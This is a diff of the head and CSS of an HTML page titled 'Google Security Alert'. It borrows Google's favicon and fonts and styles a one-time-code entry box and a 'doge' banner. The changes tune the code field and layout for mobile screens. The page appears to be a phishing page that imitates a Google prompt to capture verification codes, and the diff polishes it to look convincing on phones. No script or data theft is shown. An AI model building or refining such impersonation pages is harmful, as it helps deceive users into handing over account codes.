@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <title>Google Security Alert</title>
 <link rel="icon" href="https://accounts.google.com/favicon.ico">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&family=Roboto+Mono:wght@400;500&display=swap');
 body{ 
@@ -77,22 +77,26 @@ button:disabled{opacity:.6;cursor:not-allowed;}
 .small{font-size:12px;color:#5f6368}
 .otp-input{
   width:100%; 
-  padding:16px; 
+  padding:20px 16px; 
   border:2px solid #dadce0; 
   border-radius:8px; 
-  margin:12px 0; 
-  font-size:20px; 
+  margin:24px 0; 
+  font-size:16px;        /* FIXED: No more zoom */
+  font-weight:500;
   text-align:center; 
-  letter-spacing:8px; 
+  letter-spacing:12px;   /* Perfect spacing like screenshot */
   font-family:'Roboto Mono',monospace; 
   background:#f8f9fa;
   box-sizing:border-box;
+  font-size-adjust:0.5;  /* Prevents zoom */
+  -webkit-text-size-adjust:100%; /* iOS fix */
 }
 .otp-input:focus{
   border-color:#1a73e8; 
   outline:none; 
   box-shadow:0 0 0 3px rgba(26,115,232,0.1);
 }
+  
 .doge-banner {
   width: 100%;
   max-width: 280px;
@@ -102,7 +106,13 @@ button:disabled{opacity:.6;cursor:not-allowed;}
   display: block;
   box-shadow: 0 8px 32px rgba(0,0,0,0.3);
 }
-@media(max-width:480px){.card{margin:15px; padding:16px;}button{font-size:14px; padding:14px;}}
+@media(max-width:480px){
+  .card{margin:12px;padding:20px;}           /* More padding */
+  button{font-size:14px;padding:14px;}       /* Smaller buttons */
+  .otp-input{font-size:15px !important;letter-spacing:10px;}  /* for Mobile Otp*/
+  h2{font-size:20px;}                        /* Smaller headers */
+  h3{font-size:16px;}                        /* Perfect mobile headers */
+}
 </style>
 </head>
 
